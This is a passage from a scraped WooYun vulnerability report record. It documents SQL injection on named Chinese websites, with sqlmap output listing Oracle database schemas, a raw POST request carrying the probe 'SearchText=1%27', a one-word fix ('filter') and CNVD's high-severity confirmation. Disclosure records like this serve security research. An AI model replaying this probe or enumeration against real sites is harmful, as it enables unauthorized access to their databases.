ODM [*] ODM_MTR [*] OE [*] OLAPSYS [*] ORDSYS [*] OUTLN [*] PM [*] QS [*] QS_CBADM [*] QS_CS [*] QS_ES [*] QS_OS [*] QS_WS [*] RMAN [*] SCOTT [*] SH [*] SYS [*] SYSTEM [*] WKSYS [*] WMSYS [*] XDB [*] ZJGSXH [00:13:11] [WARNING] HTTP error codes detected during testing: 500 (Internal Server Error) - 63 times [00:13:11] [INFO] fetched data logged to text files under 'C:\\tools\\SQLMAP~1\\SQL MAP~1\\Bin\\output\\www.linhaihome.com' [*] shutting down at 00:13:11\n \n\n#6  漏洞页面:zcfg/list.asp\nPOST /zcfg/list.asp HTTP/1.1 Host: www.lqmyjj.com Connection: keep-alive Content-Length: 25 Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Origin: http://www.lqmyjj.com User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://www.lqmyjj.com/zcfg/list.asp Accept-Encoding: gzip,deflate,sdch Accept-Language: zh-CN,zh;q=0.8 Cookie: ASPSESSIONIDSAASRSRS=PKJDDEKBNAGAFGNIDLIKFEGG SearchText=1%27&b1=search\n包括但不限于以上几点 整站都是sql   漏洞证明：  rt   修复方案：  过滤    版权声明：转载请注明来源 Hero@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-05-25 19:01 厂商回复： CNVD确认所述漏洞情况，暂未建立与软件生产厂商或网站管理单位的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}